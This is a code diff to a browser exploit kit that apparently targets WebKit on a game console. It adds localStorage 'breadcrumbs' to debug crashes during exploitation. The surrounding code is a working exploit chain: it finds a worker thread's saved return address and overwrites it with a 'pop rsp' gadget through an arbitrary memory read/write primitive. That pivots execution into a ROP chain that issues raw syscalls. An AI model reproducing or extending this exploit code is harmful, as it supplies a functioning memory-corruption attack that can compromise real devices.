@@ -94,6 +94,7 @@ async function find_worker_return_slot(p, stacks, libKernelBase) {
                     here++;
                 }
                 if (here === 1) {
+                    try { window.__wwrPicked = want.rva; } catch (e) {  }
                     jbmark("WORKER-RET-FINGERPRINT", "hit=0x" + hitHere.toString()
                         + "-rva=0x" + want.rva.toString(16)
                         + "-rank=" + wants.indexOf(want)
@@ -170,7 +171,35 @@ function jbmark(tag, detail) {
     } catch (e) {  }
 }
 
+/* Crash-persistent breadcrumbs.
+   ---------------------------------------------------------------------------
+   Once the chain is armed, a mistake kills the WebProcess synchronously: the
+   coredump names no address, every queued jbmark is lost, and the screen shows
+   whatever it showed before the pivot. That is how 0xa0020307 arrived with the
+   log ending at MODULE-BASES. localStorage is the only thing that outlives the
+   process, so commit a marker BEFORE each irreversible step and read the trail
+   back on the next load -- the last crumb written is where it died. */
+const CRUMB_KEY = "slopkit-crumbs";
+function crumb(tag) {
+    try {
+        const prev = localStorage.getItem(CRUMB_KEY) || "";
+        localStorage.setItem(CRUMB_KEY, prev + (prev ? ">" : "") + tag);
+    } catch (e) {  }
+}
+function crumbsTake() {
+    try {
+        const v = localStorage.getItem(CRUMB_KEY) || "";
+        localStorage.removeItem(CRUMB_KEY);
+        return v;
+    } catch (e) { return ""; }
+}
+
 async function prepare(p) {
+
+    const prevCrumbs = crumbsTake();
+    if (prevCrumbs)
+        jbmark("PREV-CRUMBS", "the last run died right after: " + prevCrumbs);
+    crumb("prepare");
 
     let textArea = document.createElement("textarea");
 
@@ -657,6 +686,7 @@ async function prepare(p) {
     await wait_for_worker();
     jbmark("PREP-POST-WORKER-AWAIT", "survived-the-first-yield");
 
+    crumb("find_worker");
     let worker_stacks = find_worker(p, libKernelBase);
     let worker_stack = worker_stacks[0];
     jbmark("PREP-WORKER-STACK", "stack=0x" + worker_stack.toString()
@@ -671,6 +701,9 @@ async function prepare(p) {
         // Backward-compatible path for original profiles without a saved-PC fingerprint.
         return_address_ptr = worker_stack.add32(OFFSET_WORKER_STACK_OFFSET);
     }
+    crumb("retslot@0x" + return_address_ptr.toString()
+        + (window.__wwrPicked !== undefined
+            ? "/rva0x" + window.__wwrPicked.toString(16) : ""));
     let original_return_address = p.read8(return_address_ptr);
     let stack_pointer_ptr = return_address_ptr.add32(0x8);
 
@@ -696,8 +729,10 @@ async function prepare(p) {
                 + "-poprsp=0x" + gadgets["pop rsp"].toString()
                 + "-rsp=0x" + chain.stack_entry_point.toString());
 
+        crumb("arm(rsp=0x" + chain.stack_entry_point.toString() + ")");
         p.write8(return_address_ptr, gadgets["pop rsp"]);
         p.write8(stack_pointer_ptr, chain.stack_entry_point);
+        crumb("armed");
 
         if (window.jb && window.jb.hot)
             jbmark("CHAIN-PRE-POST", "next=worker.postMessage(0)-rop-executes-now");
@@ -705,8 +740,10 @@ async function prepare(p) {
             worker.onmessage = function (e) {
                 resolve(1);
             }
+            crumb("postMessage");
             worker.postMessage(0);
         });
+        crumb("worker-answered");
         if (window.jb && window.jb.hot)
             jbmark("CHAIN-POST-POST", "worker-answered-p1=" + p1);
         if (p1 == 0) {
@@ -747,7 +784,9 @@ async function prepare(p) {
     jbmark("PREP-GETPID-PRE", "retval=0x" + chain.return_value.toString()
         + "-poisoned-next=chain.syscall(SYS_GETPID)");
 
+    crumb("getpid-call");
     let pid = await chain.syscall(SYS_GETPID);
+    crumb("getpid-returned");
 
     jbmark("PREP-GETPID-POST", "raw=0x" + pid.toString());
     if (pid.low == JB_POISON.low && pid.hi == JB_POISON.hi) {
@@ -762,6 +801,7 @@ async function prepare(p) {
         throw new Error("Webkit exploit failed.");
     }
     jbmark("PREP-GETPID-OK", "pid=" + pid.low);
+    crumb("prepare-OK");
 
     return { p: p2, chain: chain };
 }
@@ -769,4 +809,4 @@ let fwScript = document.createElement('script');
 document.body.appendChild(fwScript);
 
 window.__offsetsScript = fwScript;
-fwScript.setAttribute('src', `${SLOPKIT_ROOT}offsets/${window.fw_str}.js?v=21`);
+fwScript.setAttribute('src', `${SLOPKIT_ROOT}offsets/${window.fw_str}.js?v=22`);
